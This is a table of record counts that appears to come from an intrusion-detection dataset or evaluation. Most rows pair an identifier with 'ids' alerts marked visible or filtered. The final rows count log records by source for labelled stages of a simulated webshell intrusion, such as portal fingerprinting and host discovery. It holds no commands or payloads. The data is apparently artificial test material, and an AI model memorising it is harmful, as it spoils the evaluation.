| 607c5b0a-2cac-4e88-aa50-f2ed97944460 | ids | visible: 1 |
| 60be7857-f172-48d5-955d-cbc6d8e29846 | ids | visible: 1 |
| 60e7ebf0-ed45-4076-ad9f-d47c86c09849 | ids | visible: 1 |
| 60eb8c4d-8976-4b1d-9829-284d9650b058 | ids | visible: 1 |
| 610734d1-466a-4252-bc4a-b36fd1ff9890 | ids | visible: 1 |
| 61091126-6569-4497-9859-9fed5454c578 | ids | visible: 1 |
| 6129235b-195c-4b97-b12b-8719b9fe748d | ids | visible: 1 |
| 617648b3-cd22-422c-9ae4-5f7a710f6da7 | ids | visible: 1 |
| 6210a0a3-f7dd-4fb2-893d-b5bf019717dc | ids | visible: 1 |
| 63415164-2deb-465a-aa90-dbc10b0c4fe4 | ids | visible: 1 |
| 6351816a-d9c2-45e1-bf94-c4ba3b57e71b | ids | visible: 1 |
| 6361cfa4-3d45-4bd8-bd40-99e60bb3eba9 | ids | visible: 1 |
| 636f1c7e-6b06-43a7-bded-5a38efedf8d2 | ids | visible: 1 |
| 647ac707-a821-440c-814e-a0e37835c2f0 | ids | visible: 1 |
| 64b68c51-adf1-4c4f-b803-fe40f50fb96a | ids | visible: 1 |
| 6508b542-90f6-4e93-9a5b-d8aa2230c144 | ids | visible: 1 |
| 65e1911e-a3a6-47de-8768-f622367b46b4 | ids | visible: 1 |
| 65f3307b-507c-42af-a710-2dece4d2c7a9 | ids | visible: 1 |
| 66387e24-55bd-4cad-8e9c-556586a442cf | ids | visible: 1 |
| 666da339-c59d-4c6f-b1ae-0b6a70e81e33 | ids | visible: 1 |
| 67994275-083e-4ee6-bba4-d3c9d13b2ba8 | ids | visible: 1 |
| 67a5ba5c-3243-4cba-8a50-15ca8af4cd81 | ids | filtered: 1 |
| 67e1797d-a6b9-4942-aada-89532302b845 | ids | visible: 1 |
| 68741ef0-fd46-4ebe-a7db-9d23e653d71e | ids | visible: 1 |
| 6887b1df-d64c-457c-836d-566dd6f00353 | ids | visible: 1 |
| 6894f033-4d53-4d6f-ada8-4d44ca533032 | ids | visible: 1 |
| 6957981a-80ef-4265-85bb-8177bed221ef | ids | visible: 1 |
| 696a178d-30c0-4320-89fd-dd3138498bcb | ids | visible: 1 |
| 69ff9af4-dd50-422c-9759-2cbe7dfa5a5a | ids | visible: 1 |
| 6a54c97f-d8ea-4363-8293-b0162ec4ecb0 | ids | visible: 1 |
| 6ac7175a-a89d-4714-99f3-79e22417cf33 | ids | visible: 1 |
| 6b9c786f-3385-408d-b3c7-710e45fcf08e | ids | visible: 1 |
| 6ba94051-7e3e-4b8f-ae2c-a7a65a2db254 | ids | visible: 1 |
| 6bd5945d-4f69-4ee0-8b76-04c0f20a45e2 | ids | visible: 1 |
| 6bf669a3-9048-48c8-9577-d3dc26c3fa02 | ids | visible: 1 |
| 6d358114-d060-4d65-8ce6-cd1b624d0e62 | ids | visible: 1 |
| 6db1b6a9-c6fb-472d-92e3-7336d71d2a7d | ids | visible: 1 |
| 6db68ca3-091a-40c2-a023-6a4f5d1daf4c | ids | visible: 1 |
| 6e4d8352-4f92-486e-8d33-440dd02f861a | ids | visible: 1 |
| 6ea93008-1ed1-4776-9682-1d9cbc1e4692 | ids | visible: 1 |
| 6f05b4a8-d564-46b7-80c6-bbeeb0befd04 | ids | visible: 1 |
| 6f31a77f-b965-458a-b2f1-492275aefc1a | ids | visible: 1 |
| 6f63b989-37f2-4e8a-8578-58b4e40daabb | ids | visible: 1 |
| 6fea30b8-8176-4efe-9b1b-6b092099cdb8 | ids | visible: 1 |
| 702e56fa-ec3c-497a-888b-21a67c53ef2f | ids | visible: 1 |
| 70c263e9-e2c9-491e-b06d-e8612460f026 | ids | visible: 1 |
| 70dd4b6d-1f8f-475a-95f9-247e9a4d50e0 | ids | visible: 1 |
| 71299be0-0fa0-4482-937a-29d217731844 | ids | visible: 1 |
| 714ffc88-f02f-4892-8fcd-f118f133363a | ids | visible: 1 |
| 72a59367-c3a0-4618-90e9-efaa5615e182 | ids | visible: 1 |
| 7309ea5a-949a-409a-b50d-c3a43436493d | ids | visible: 1 |
| 736ab77d-4cb1-4d9f-b765-d16d39f5e519 | ids | visible: 1 |
| 741fcc47-0750-4d5e-bd6d-7afec71e6b86 | ids | visible: 1 |
| 75259b44-abf3-470d-906e-9a198ccab152 | ids | visible: 1 |
| 759f7a9c-4e44-4754-b94c-60b827ae8bfc | ids | visible: 1 |
| 76a4197d-a53c-4dc0-bb4f-357836fd5345 | ids | visible: 1 |
| 76e1ea32-8c26-4d90-b00d-66f71b017bdf | ids | visible: 1 |
| 7739697d-e0a7-42db-b398-f238765a7386 | ids | visible: 1 |
| 77777083-59ae-487e-b274-342bbc81ad5e | ids | visible: 1 |
| 778b1d6e-18be-4657-a0d7-e9c992813c8b | ids | visible: 1 |
| 78176a58-37a1-432e-a0f0-e96aa2ad46b2 | ids | visible: 1 |
| 7844998b-f60e-4cb4-92b3-d7ea7cdf59a0 | ids | visible: 1 |
| 789aef76-65be-4f4f-bee1-6ecaf04dd647 | ids | visible: 1 |
| 79331c2b-0764-4049-8120-acf0559966fe | ids | visible: 1 |
| 79564f84-42e2-46c3-b614-04de9d3413ab | ids | visible: 1 |
| 7ad35bc7-6fc5-4270-866d-2e60e345570f | ids | visible: 1 |
| 7b1125c4-77d4-44bf-8ebd-c57176bd8612 | ids | visible: 1 |
| 7b1f8fab-bcf6-40eb-a127-9bbc1cd1011d | ids | visible: 1 |
| 7b47a416-3db4-4d3e-b076-be6681863377 | ids | visible: 1 |
| 7b7ee458-6e59-4831-a9e6-325f3343d73c | ids | visible: 1 |
| 7b897b72-8261-4387-820a-e18a9f67b9e4 | ids | visible: 1 |
| 7bb015af-76ff-4a7f-bb0f-718355b7ac0c | ids | visible: 1 |
| 7d09e546-04ec-426b-ae3a-56b6559e9830 | ids | visible: 1 |
| 7d1c5f6d-9833-4770-8dc8-bd37a536c07c | ids | visible: 1 |
| 7d890e71-460b-4778-bea6-e7bc96212a6c | ids | visible: 1 |
| 7e0cee6e-283a-43d5-8303-7c0d1c34ba31 | ids | visible: 1 |
| 7f242093-dd85-4fa7-bfb2-34d13d207327 | ids | visible: 1 |
| 80092a93-b672-4769-bf57-d9dac5f09013 | ids | visible: 1 |
| 804b5a78-3591-4beb-998c-184d86d5184a | ids | visible: 1 |
| 8060fe72-113c-4db4-90ee-240db1140e16 | ids | visible: 1 |
| 812b52e0-1b4f-47ab-82e8-88d089e8a0e5 | ids | visible: 1 |
| 8137ab99-10d4-486d-bc45-399a91e9489b | ids | visible: 1 |
| 813c321e-5640-4712-bd32-8ed5ce9b5cf2 | ids | visible: 1 |
| 81425757-4871-4453-a85a-efca670b8284 | ids | visible: 1 |
| 821cbbd0-85a1-45d2-96e2-ffb565aa18af | ids | visible: 1 |
| 82f4878e-c779-4cf7-87aa-ca8f8253486c | ids | visible: 1 |
| 82f98773-a325-4819-a59e-504324249e5e | ids | visible: 1 |
| 832d3377-421a-4eca-896c-2cc3f7000e42 | ids | visible: 1 |
| 83967bc0-7806-484f-91b3-5a91c72df7de | ids | visible: 1 |
| 83a41bb9-b4ca-4104-a3dc-96d7e271d659 | ids | visible: 1 |
| 841a1dce-4e6a-44e8-b403-a2c915ed6282 | ids | visible: 1 |
| 8491002c-3b1d-4847-8777-58812e57487a | ids | visible: 1 |
| 84db1782-c651-4caa-b70f-b50b8989c278 | ids | filtered: 1 |
| 852ebc8e-8ab5-48bc-868d-4efd06510770 | ids | visible: 1 |
| 85a7efc6-c5ca-431b-8316-ab5f27229628 | ids | visible: 1 |
| 85de2f01-6b15-4d36-a8cf-50c8aa11df93 | ids | visible: 1 |
| 86304cbc-6cf2-4956-844a-20c32329c055 | ids | visible: 1 |
| 86e06a93-9313-4ee1-9883-2fdebf709a04 | ids | visible: 1 |
| 875a9df5-7b86-436a-a728-90c2a2f65d58 | ids | visible: 1 |
| 881d3409-0285-4050-855f-27545ef35df5 | ids | visible: 1 |
| 88ee15b5-4315-4f50-bbac-7879e2fa95c6 | ids | visible: 1 |
| 89558d02-ff16-4833-997b-7c47f8bd78d4 | ids | visible: 1 |
| 897713e1-4a43-4e85-a641-5d45f144d634 | ids | visible: 1 |
| 899e4e4e-5482-4fee-8967-8d1a1c06c0b2 | ids | visible: 1 |
| 8a0744b3-ba47-4e58-9418-65e061649fb7 | ids | visible: 1 |
| 8a725feb-ba63-4bf1-a773-053ac8066f0d | ids | visible: 1 |
| 8af3ba2b-b4fd-43bd-8a40-73bcbe363f72 | ids | visible: 1 |
| 8afc6ea2-dba3-4c29-93cb-93138c4257b6 | ids | visible: 1 |
| 8b06d375-bf74-4ff9-b8b1-d5db4b409783 | ids | visible: 1 |
| 8b17071f-67ec-4098-90b2-127247dce3f3 | ids | filtered: 1 |
| 8b4e623e-a360-4100-a54d-89c5160f8659 | ids | visible: 1 |
| 8b60938e-a9e6-4844-a37b-b21ef880f710 | ids | visible: 1 |
| 8bd229e8-b4d8-499a-b880-770fbe428707 | ids | visible: 1 |
| 8c576890-d7dd-43ce-b65e-7ca9b899c60d | ids | visible: 1 |
| 8c5d1c92-6426-4948-8766-3dbe9bd81d9c | ids | visible: 1 |
| 8c64e98f-5e4b-473d-9974-276166fcd96d | ids | visible: 1 |
| 8d3b6edd-9e69-4fd4-be52-3dc5c7fa468e | ids | visible: 1 |
| 8d571473-59f8-4951-a72f-904f9e941fff | ids | visible: 1 |
| 8dac8b7c-5f74-419d-bf39-762d54be9cb0 | ids | visible: 1 |
| 8e919172-f67f-4bd8-a153-b6570d8a325f | ids | visible: 1 |
| 8f5d3921-4f18-4ecc-8a6f-676ecf19b0fd | ids | visible: 1 |
| 8fca1b81-0d66-497b-9c94-b8cee350822e | ids | visible: 1 |
| 907d3276-1143-4cf2-a32e-67da1b9b49c6 | ids | visible: 1 |
| 9080848a-3a47-4046-abb4-db1dec64439c | ids | visible: 1 |
| 90e687e1-e626-4ebe-8e7f-1d065ea9e91f | ids | visible: 1 |
| 9151a2b7-76ed-4704-9014-26427b5a6bc2 | ids | visible: 1 |
| 91b65822-dc26-468e-9df7-c269593c1c52 | ids | visible: 1 |
| 92518908-8036-42de-8763-e152d51919e7 | ids | visible: 1 |
| 92819c9c-3bc1-4689-9dfa-11fedc54fdab | ids | visible: 1 |
| 92ffbb6f-86d9-4605-ab04-6b865507909c | ids | visible: 1 |
| 93c21017-203c-4e75-a2fb-f3eca86a2b42 | ids | visible: 1 |
| 93fc0fc3-ff40-4d93-b18e-3921791c82d8 | ids | visible: 1 |
| 944da64d-dade-4955-a45d-d8ecf5bc1c13 | ids | visible: 1 |
| 945054c9-ff6b-486a-9273-4cc2de9100c0 | ids | visible: 1 |
| 94a491f5-ab17-4ce8-a1e0-8d5d9b44976a | ids | visible: 1 |
| 94cc05ed-89f6-4c1f-9a4a-98139ec2d2fe | ids | visible: 1 |
| 94f7c443-3c9d-43cb-9f44-c4a6dc68736e | ids | visible: 1 |
| 9714ac92-01a5-40e5-b056-6fc6104ca9ce | ids | visible: 1 |
| 971e1f5e-f0c8-43b6-83df-665233e7d35c | ids | visible: 1 |
| 972afa2f-0c4e-4c5a-add8-e8e80e55d742 | ids | visible: 1 |
| 978d580c-4df2-4944-b97d-3949e94fa3a2 | ids | visible: 1 |
| 98894458-26de-44f2-9c0e-a7814337ac05 | ids | visible: 1 |
| 98c22b9e-7e10-4a98-883d-70b8508cdc04 | ids | visible: 1 |
| 98d80d74-ea6b-45b9-8a18-6136d1f53cea | ids | visible: 1 |
| 9928ec74-a34b-4425-8879-a2c2bb544028 | ids | visible: 1 |
| 99e4581d-2ba5-4784-a765-9b700d8deafd | ids | visible: 1 |
| 9add7c67-2fd7-4e7a-afb9-18d6326e420a | ids | visible: 1 |
| 9ae54683-16d4-45ea-8539-4be8b8e35e45 | ids | visible: 1 |
| 9b3de61e-45c9-4158-bce9-65ae3c2505cd | ids | visible: 1 |
| 9b533732-299d-46e5-bdaa-fc65118fb806 | ids | visible: 1 |
| 9b69aa76-b662-486f-b718-37b439edc0bd | ids | visible: 1 |
| 9bc5c3ea-6a33-4f5b-96cb-9c3a4459e9ca | ids | visible: 1 |
| 9c529c51-189b-4066-93f2-cb5c3a9fe4bb | ids | visible: 1 |
| 9c7e6d6f-f9ef-4ecc-a331-102c8098f727 | ids | visible: 1 |
| 9caca3a2-abe4-4757-b59b-c35a60e91fe7 | ids | visible: 1 |
| 9d43bb37-3d82-4a1f-89dc-6356fd87d782 | ids | visible: 1 |
| 9d9b9017-e314-4ac7-86fb-9d7a2b8edd58 | ids | visible: 1 |
| 9df8eafd-ebd2-4134-ade9-0f49d21b65c9 | ids | visible: 1 |
| 9e7330af-f290-4417-acc5-356f9f2b5452 | ids | visible: 1 |
| 9f1b74b9-bc36-42a5-95e5-c01f23726af3 | ids | visible: 1 |
| 9f27df44-ca8f-4946-9770-2c630a495de8 | ids | visible: 1 |
| a09a573b-ada4-42a1-ac53-a73e84e72188 | ids | visible: 1 |
| a0b568ed-b0a7-48f7-84d7-4efdf191fba4 | ids | visible: 1 |
| a0bf4dbc-aaa2-433c-8f1b-7b780d850557 | ids | visible: 1 |
| a0d8647d-009d-4f20-9453-f2f304a5a65b | ids | visible: 1 |
| a155c7af-2dc6-4285-839a-29f8dc175c39 | ids | visible: 1 |
| a2170af3-7a24-4631-814e-ebea5db303ce | ids | visible: 1 |
| a21f0704-0169-4b6b-9985-f9f0d0ec3b0e | ids | filtered: 1 |
| a25637eb-821b-4c62-8abb-087963500681 | ids | visible: 1 |
| a25fc4e4-981d-4ffc-bca9-a6348c2aa1ca | ids | visible: 1 |
| a2809bc3-c993-46e0-b23a-b4508491556e | ids | visible: 1 |
| a3252c92-4372-49dd-a663-30eec84a55df | ids | visible: 1 |
| a332fb2e-cba8-4955-a00b-783bca97330f | ids | visible: 1 |
| a47ba637-23f0-425b-b11a-508b55b438b6 | ids | visible: 1 |
| a4c9cb48-df21-45cb-bc9b-01cfa6e5e012 | ids | visible: 1 |
| a55f7e1d-6e8f-4750-af4f-d219741647df | ids | visible: 1 |
| a5a112f0-847a-4140-9a1f-f680a7af4a30 | ids | visible: 1 |
| a61c37bd-832e-4a1a-8227-ff515c7ea5e8 | ids | visible: 1 |
| a722f754-75ed-46cc-9d66-6cdcf91456f1 | ids | visible: 1 |
| a75a9fc5-18ed-46d0-ab71-f62fa0753c2a | ids | visible: 1 |
| a778a505-09fb-408d-897b-844b70cd6b7b | ids | visible: 1 |
| a84cc1e2-8b71-4afa-adb8-4992ddf7ee48 | ids | visible: 1 |
| a88903d6-b08e-4b9d-a546-b9d603aed8e1 | ids | visible: 1 |
| a94d87e1-0f21-4765-b8a9-307fa02bcab0 | ids | visible: 1 |
| aafc506f-297d-4306-be56-89b1d4f6dc0e | ids | visible: 1 |
| ab6b1c05-f543-473a-9c18-579b1ee34255 | ids | visible: 1 |
| abb70fd3-006d-4ab8-babe-5f745874e169 | ids | visible: 1 |
| ac090684-102d-4799-86c6-47c39f389bb1 | ids | visible: 1 |
| ac6aa51e-a937-47cc-b187-879a8cd2ddab | ids | visible: 1 |
| ad0dcd62-0409-4a6e-b25b-4509bd57885e | ids | visible: 1 |
| adcea21d-2829-4f9f-babb-5ca5807773bd | ids | visible: 1 |
| ae78e568-1ff3-438e-be76-5a8be00fec85 | ids | visible: 1 |
| ae9b765d-fb13-495e-889c-87d0ae8e9269 | ids | visible: 1 |
| aefdc68c-e087-44c1-ae02-d5d118ab1401 | ids | visible: 1 |
| af8aface-fcfd-43cd-a482-0a7ef15bb69d | ids | visible: 1 |
| afb881ca-ad86-4aee-a000-952714fc25ae | ids | visible: 1 |
| b0518264-2a45-4a92-8435-7969b64466b6 | ids | visible: 1 |
| b062e286-d78b-421d-802e-215cfc9cb6e6 | ids | visible: 1 |
| b087bc8d-3ae0-43bd-b0c9-d9e244a6a141 | ids | visible: 1 |
| b102ece9-72f4-4538-b791-ee61b3d69fb5 | ids | visible: 1 |
| b11fe723-bc1c-488a-becc-73e60d10c22a | ids | visible: 1 |
| b1593cf3-6a82-477f-8cb2-b9ee6d8ac4f1 | ids | visible: 1 |
| b1609053-572f-4b54-a5d2-82af4c916d70 | ids | visible: 1 |
| b1961e20-9793-4ceb-a2ab-6969e4d551bb | ids | visible: 1 |
| b27e640b-4604-4048-98b2-ad9b643ac7bc | ids | visible: 1 |
| b295f9af-ce72-4505-bda4-85fd0842473c | ids | visible: 1 |
| b31cc95f-445a-47a2-a082-b3e646bd4303 | ids | visible: 1 |
| b4182231-79f3-4028-ac34-6588be2bea7c | ids | visible: 1 |
| b42e1ef0-6f3f-471a-9f43-a1d44ec12169 | ids | visible: 1 |
| b4355234-84a5-4046-871d-c1a090de1015 | ids | visible: 1 |
| b4f7c20a-2ef0-490d-869a-81173dcacaa5 | ids | visible: 1 |
| b5924504-f297-46cc-881c-c2a976687d6d | ids | visible: 1 |
| b5c40742-151b-4261-bdec-19593f77da51 | ids | visible: 1 |
| b5ee1e8e-d795-4261-a4a6-2cd54b713047 | ids | visible: 1 |
| b5f752c5-5de1-4917-bbdb-bdcdf70211f6 | ids | visible: 1 |
| b62c3295-30a3-4685-9249-8895d1fac04f | ids | visible: 1 |
| b65642a6-f600-4e55-9c72-c93aeb2de906 | ids | visible: 1 |
| b6b85104-e941-42c1-896c-87bb85d4a9a8 | ids | visible: 1 |
| b73d584c-927e-4a6c-968d-3eab7291a1ba | ids | filtered: 1 |
| b7497048-23e9-4bec-bbae-150acaa8d5da | ids | visible: 1 |
| b79b21ca-0233-4aa6-a61c-80d7151ffb3f | ids | visible: 1 |
| b8c8d834-8021-4f50-a875-84c6917f1716 | ids | visible: 1 |
| b935d346-d5f1-4497-b4d1-dc60696dd92d | ids | visible: 1 |
| b99f9a3d-2db7-4f4d-914c-086bd9cca55f | ids | visible: 1 |
| b9fea3b5-9015-4ef2-8b7e-1b852b3499c6 | ids | visible: 1 |
| bc0e5e14-6fb0-441f-ab40-2f5db524a672 | ids | visible: 1 |
| bc722345-802e-4c94-83a0-6b3c6346df81 | ids | visible: 1 |
| bcaaa50f-15eb-4bf9-b9f0-a146f21dc415 | ids | visible: 1 |
| bcdc0ae8-4749-4197-81a7-fb66288b7072 | ids | visible: 1 |
| be8fdddd-87c5-47ac-a61a-26206eba1c5e | ids | visible: 1 |
| c0704c3d-43e3-4765-ad88-5278cd53f630 | ids | visible: 1 |
| c0aba3a2-67c2-4c87-bbd6-89583ba6c759 | ids | visible: 1 |
| c247dbd0-4fb8-4855-b121-2519283dc60f | ids | visible: 1 |
| c2edc8a2-4478-4cd9-bd8b-ad73320ff125 | ids | visible: 1 |
| c37753f0-d55d-4740-b935-b7dbc35c091e | ids | visible: 1 |
| c4ff5bd6-d311-49d7-a712-712dae8a5cc1 | ids | filtered: 1 |
| c6037b41-0610-4e62-b56b-7b7b73505a50 | ids | visible: 1 |
| c61089a7-fe14-46bf-a073-f9c5da1c6a12 | ids | visible: 1 |
| c6f951ae-4497-438f-87b2-90f7dd74e0d0 | ids | visible: 1 |
| c7213383-a272-4d46-bfa6-346bd1c9d016 | ids | visible: 1 |
| c82cb58b-3342-47d0-9901-5c5d8dfe8183 | ids | visible: 1 |
| c8394c84-96af-4c42-925c-886ff155965d | ids | visible: 1 |
| c8c97e74-52e3-417d-8275-11deeb5f6ac0 | ids | visible: 1 |
| c8e3dbad-a092-4d95-bdb2-42f499dd9723 | ids | visible: 1 |
| c910c3e8-da46-4545-b8a0-be8c370857b0 | ids | visible: 1 |
| c93b8df5-456e-442d-bd8a-ac9dd5461bf5 | ids | visible: 1 |
| c9d4d187-6b5a-475b-9318-bf70c36a425a | ids | visible: 1 |
| ca8839fd-716f-4e7d-b7a7-7eb1c699f8d3 | ids | visible: 1 |
| caddf1fb-be3c-45a6-9649-3d6bfac5ee81 | ids | visible: 1 |
| cbb28646-e011-4d32-b8d0-4a1c22aac1ad | ids | visible: 1 |
| cbb4a9f0-d7ae-4a41-837e-908f339a04e1 | ids | visible: 1 |
| cbf51eb9-b256-4dd2-9bb5-7a3565965371 | ids | visible: 1 |
| cc01a12d-3d93-45c2-a162-2e6e4ec5bcdc | ids | visible: 1 |
| cc4bf17e-4635-40dd-9036-ef7cdaca184b | ids | visible: 1 |
| cc5a89e4-ed32-44b0-a600-2775a2bc55b0 | ids | visible: 1 |
| cc61ac00-4c8b-4959-a602-175025f47d20 | ids | visible: 1 |
| cc9f34da-6214-4639-a0cc-716e683d9344 | ids | visible: 1 |
| ccc321e1-f1f4-4a7c-a59b-b8d26fb731cd | ids | visible: 1 |
| ccd01a06-7667-4825-806b-33b70d05ff8e | ids | visible: 1 |
| cd35e1e4-d825-4d3b-8cd9-805a1fed6909 | ids | visible: 1 |
| ceaaf1cb-7f11-4332-b354-c6896630ba18 | ids | visible: 1 |
| cef1ca44-2685-4f26-85ff-68386af5e481 | ids | visible: 1 |
| cf2d93f1-8e02-4ab9-90d4-e4bbb55eec05 | ids | visible: 1 |
| cf456eaf-491e-4596-bf64-2921c7e5511f | ids | visible: 1 |
| cf7e3971-21a5-4c0d-bc07-e18ce6a4d1be | ids | visible: 1 |
| cfcb1b9f-675c-48e0-94e0-a02790519330 | ids | visible: 1 |
| d03c80fe-544d-441f-ae36-9a27825617a5 | ids | visible: 1 |
| d083be45-b09e-4490-9d2e-4059ee13f90b | ids | visible: 1 |
| d16fae6b-2aa4-48b2-b87a-e5ed80f3a5da | ids | visible: 1 |
| d2b1da7e-58f6-4406-ba11-93c2e1ea7a70 | ids | visible: 1 |
| d2ccd98f-8a35-4f39-b12a-19b0a11c6a6d | ids | visible: 1 |
| d2da6fa0-1d0b-4dbd-a261-96ac56a6ad43 | ids | visible: 1 |
| d2e3371a-2d41-41db-8dc3-e327473bb143 | ids | visible: 1 |
| d319e526-1e3a-4f62-8133-aa05b8972f7d | ids | visible: 1 |
| d31a9f31-bd77-46fd-940d-0f92d5c36ecd | ids | visible: 1 |
| d37e79cc-9ab5-44e7-90a7-3fbe906fcd74 | ids | filtered: 1 |
| d3a75304-e6af-4324-891f-116d6dedbd10 | ids | visible: 1 |
| d3b4f847-59da-4bd6-9142-3d2216cfdbed | ids | visible: 1 |
| d3d07245-fa1e-4732-84ff-d5de6cee4f54 | ids | visible: 1 |
| d3de9f5c-3bd1-4b6e-9f68-3de0a1dcac1a | ids | visible: 1 |
| d4405b7e-02a3-4482-9805-02683f332163 | ids | visible: 1 |
| d49a5d02-d444-4a37-bdfb-e35ebada6b1f | ids | visible: 1 |
| d54a18eb-986b-4063-865a-f831302d0335 | ids | visible: 1 |
| d5942bc5-a03d-430c-bc74-578081cea8df | ids | visible: 1 |
| d5b68a76-0377-4fae-9165-8584f0c6a4c3 | ids | visible: 1 |
| d5f70faa-7351-4022-8aab-c573e7ca67e9 | ids | visible: 1 |
| d66796d9-5ab1-45ce-8aad-ada932dac75a | ids | visible: 1 |
| d6a0eeae-99fc-4439-8df7-966117301847 | ids | visible: 1 |
| d6c3843d-739d-46aa-a867-be10b3c41149 | ids | visible: 1 |
| d6cd88e2-51fe-4310-b526-9d6ecd83618e | ids | visible: 1 |
| d6d50d38-1867-47ca-bcb4-4114827f18f3 | ids | visible: 1 |
| d75fb5ad-0ebc-46ea-918f-a94a88fba1db | ids | visible: 1 |
| d7ed318d-d681-470a-b81b-d2a16a453e37 | ids | visible: 1 |
| d845f7d3-c71d-445a-a923-cc4d0ead942a | ids | visible: 1 |
| d8894e51-7ccd-40e0-b5dd-f1b9e6f4b462 | ids | visible: 1 |
| d8a7fbec-642c-492c-a6dd-1d8af2397ad3 | ids | visible: 1 |
| d8fb4109-6b2f-4103-abdf-2036b9db041f | ids | visible: 1 |
| d915df36-1307-4a7d-9973-e7f2be46679c | ids | visible: 1 |
| d96b9e4e-417c-4ab9-971b-9d18a50dc73d | ids | visible: 1 |
| d97ba5cc-091b-4643-996f-3a6ae778ec36 | ids | visible: 1 |
| d9b108c3-b9a8-4fe4-a223-2eaa516d8e1b | ids | visible: 1 |
| dacd5611-5d6c-44ac-aca4-7e249fa234f7 | ids | visible: 1 |
| dadfb711-3fb1-447e-8bba-c753d7518f04 | ids | visible: 1 |
| db3361f5-b287-4e5a-beff-22147431e63e | ids | visible: 1 |
| db5531a8-8d3a-41a0-abf4-546b972fa6d9 | ids | visible: 1 |
| db5a9d6e-fdc2-4fcf-b40e-b13f0b921e57 | ids | visible: 1 |
| dc59c85f-9cf4-4687-a686-2ab02a668102 | ids | visible: 1 |
| dd98dba5-f37d-492b-a6d5-1fec7d9cc543 | ids | visible: 1 |
| de09f86b-7d3a-45f0-ad87-df6db3bd81d1 | ids | visible: 1 |
| de4d7b9c-bcee-4dc1-8451-a1326d3385d2 | ids | visible: 1 |
| def1c2d7-355c-449c-bced-c34abce0d9b0 | ids | visible: 1 |
| df12f314-6fb0-4210-931f-2e77e454235b | ids | visible: 1 |
| df43bf7a-c0de-4db4-9b41-cbf62f0f9ab9 | ids | visible: 1 |
| df5ab219-3b67-44a5-af0b-4237faae57d6 | ids | visible: 1 |
| e0d0fd4f-5a50-4c40-86d1-8d3c48f920f1 | ids | visible: 1 |
| e1b50c3e-f56d-477c-a394-1f6161062284 | ids | visible: 1 |
| e1fbb07a-9c2f-4bc4-9be9-62bbd3787ddd | ids | visible: 1 |
| e249332d-b434-4f58-aa0a-d611105cd390 | ids | visible: 1 |
| e287d9ab-9423-4abc-93a8-ab0057b15201 | ids | visible: 1 |
| e2f419df-5a64-4b06-ac32-542f1ec0c757 | ids | visible: 1 |
| e32dd859-9645-4ae2-8b5b-49cf9402468f | ids | visible: 1 |
| e3430248-ea2d-415c-a17a-1201b1bea12d | ids | filtered: 1 |
| e3f536df-637e-4556-9a9d-1d83fb646122 | ids | visible: 1 |
| e4972c7a-be98-4dcb-b3be-163d63db2824 | ids | visible: 1 |
| e4d7f93b-ed9b-4f30-9c5c-1173b8e63c7a | ids | visible: 1 |
| e51b0e32-9eb5-4979-9270-007d2bb75405 | ids | visible: 1 |
| e5aed759-360e-4400-b166-244439a1bc79 | ids | visible: 1 |
| e5b48969-3aee-45b5-a663-f1ff1a752683 | ids | visible: 1 |
| e638e410-1f07-4d5e-9321-c1f1c8a1f116 | ids | visible: 1 |
| e671b1c2-0830-44a6-927b-2c442efa5e14 | ids | visible: 1 |
| e67b8bf0-4b62-430b-bba4-3be0d48c5c47 | ids | visible: 1 |
| e67fa26a-242c-46b3-aae1-c32c8e62686f | ids | visible: 1 |
| e6a30287-7a28-4a08-aa56-3df0f9bdef8a | ids | visible: 1 |
| e6a8a272-5083-4271-b928-3925c2c34610 | ids | visible: 1 |
| e6bdb0b0-70a7-463f-96f9-c6b5023fd187 | ids | visible: 1 |
| e72c81a1-e4c6-4a8e-afc4-250286da65eb | ids | visible: 1 |
| e809e7f8-c139-4329-95e1-5087300f608e | ids | visible: 1 |
| e8478b26-e36d-4e4e-a9e2-832ee947241b | ids | visible: 1 |
| e8666758-1ba2-4a06-afce-b6fb0068ee96 | ids | visible: 1 |
| e89167ca-2b8a-481c-ac86-6635492cc11d | ids | visible: 1 |
| e8b4c338-ebc8-43c3-9fe1-a4082b2667e5 | ids | visible: 1 |
| e9cdc99f-c008-49b8-b89e-e15f49e6b429 | ids | visible: 1 |
| eb5cfb69-ce5a-463f-be62-2f8c001b30da | ids | visible: 1 |
| ec08bd4e-4294-4163-ae70-82ff7d4f2092 | ids | visible: 1 |
| ec310743-53ff-4440-85ee-6f171ed6d205 | ids | visible: 1 |
| ec975c13-a213-4dca-b223-fbed0481c594 | ids | visible: 1 |
| ecd1f986-f30c-4173-8358-4103deb7aa93 | ids | visible: 1 |
| ed8faada-69bc-4993-8337-603c25a8d61e | ids | visible: 1 |
| ed917506-d2a9-4c64-b501-990923d47596 | ids | visible: 1 |
| edb11c09-c84c-4b74-aaa0-22cdba23786e | ids | visible: 1 |
| edceb2c9-420f-430b-ad22-705703e13ed0 | ids | visible: 1 |
| edd5d041-0ea5-4d5b-a6fd-0b4672a67d7b | ids | visible: 1 |
| eddce9c9-1719-42e7-b4f2-95d54e1b16b5 | ids | visible: 1 |
| ee459574-215e-4e80-af87-6a12a1de3efb | ids | visible: 1 |
| ee748b60-78df-4ad4-b49d-8312828f2613 | ids | visible: 1 |
| eec20064-fd91-4def-8b32-c14ea98148cc | ids | visible: 1 |
| eec72492-9734-47a7-b017-0eea16407337 | ids | visible: 1 |
| eeef8641-5c21-4060-b58d-421209256029 | ids | visible: 1 |
| efd6a679-6e9c-4355-9dae-ac9a0d18bc4d | ids | visible: 1 |
| evt-001-portal-fingerprint | asa | visible: 2 |
| evt-001-portal-fingerprint | ecar | visible: 2 |
| evt-001-portal-fingerprint | web | visible: 2 |
| evt-001-portal-fingerprint | zeek | visible: 6 |
| evt-002-upload-webshell | asa | visible: 1 |
| evt-002-upload-webshell | ecar | visible: 1 |
| evt-002-upload-webshell | ids | visible: 1 |
| evt-002-upload-webshell | web | visible: 1 |
| evt-002-upload-webshell | zeek | visible: 3 |
| evt-003-first-command | asa | visible: 1 |
| evt-003-first-command | ecar | visible: 17 |
| evt-003-first-command | sysmon | visible: 15 |
| evt-003-first-command | web | visible: 1 |
| evt-003-first-command | windows_security | visible: 4 |
| evt-003-first-command | zeek | visible: 3 |
| evt-004-host-discovery | asa | visible: 1 |
| evt-004-host-discovery | ecar | visible: 10 |
| evt-004-host-discovery | sysmon | visible: 9 |
| evt-004-host-discovery | web | visible: 1 |
| evt-004-host-discovery | windows_security | visible: 2 |
| evt-004-host-discovery | zeek | visible: 3 |
| evt-005-account-process-discovery | asa | visible: 1 |
| evt-005-account-process-discovery | ecar | visible: 10 |
| evt-005-account-process-discovery | sysmon | visible: 9 |
| evt-005-account-process-discovery | web | visible: 1 |
